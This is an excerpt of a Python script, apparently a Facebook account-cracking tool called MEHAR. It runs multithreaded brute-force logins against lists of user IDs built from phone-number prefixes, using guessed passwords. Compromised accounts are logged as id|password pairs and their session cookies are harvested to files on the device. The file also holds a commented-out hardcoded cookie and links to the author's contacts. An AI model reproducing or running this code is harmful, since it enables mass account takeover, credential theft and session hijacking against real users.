...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/MEHAR.txt \033[0;97m\n')
        #100010138361148
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        linex()
                                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/MEHAR-OK.TXT")
                                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/MEHAR-CP.TXT")
                                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/MEHAR-COOKIE.TXT")
                                        linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100073442572870&mibextid=ZbWKwL/');menu()
                        elif xd in ['9','09']:
                                sep()  
                        elif xd in ['10','10']:
                                double()                              
...
def za():
    ...
    if myid in str(body):
        ...
        os.system("xdg-open https://wa.me/+923134553004")
        print(" run again python MEHAR.py")
...
def pak():
                ...
                global lim
                clear()
                print('\033[1;31m Code example: 0306,0315,0335,0345,0306,0309,0315,0321')
                ...
                with tred(max_workers=30) as MEHAR:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                MEHAR.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [MEHAR] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    # 'cookie': 'sb=3YEnZSPmzgdOF3X3fayFElQG; datr=qL0wZWBmYnZgWl2Ls28s_yvR; m_pixel_ratio=1; wd=1440x767; fr=0nBZhRnYXyeTiDVRB.AWXKBNb_7HP5pJuzgg1JDjCdu8U.BlML2o.9j.AAA.0.0.BlPRKI.AWUsNbVPhZw',
    'dpr': '1',
    ...
    'viewport-width': '564',
                        ...
                        MEHAR=str(session.cookies)
                        if "c_user" in MEHAR:
                                print('\r\r\033[1;32m [MEHAR-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                print("Cookie: "+coki)
                                open('/sdcard/MEHAR-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/MEHAR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MEHAR:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MEHAR-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MEHAR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MEHAR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MEHAR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MEHAR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/MEHAR-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/MEHAR-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [MEHAR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MEHAR-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
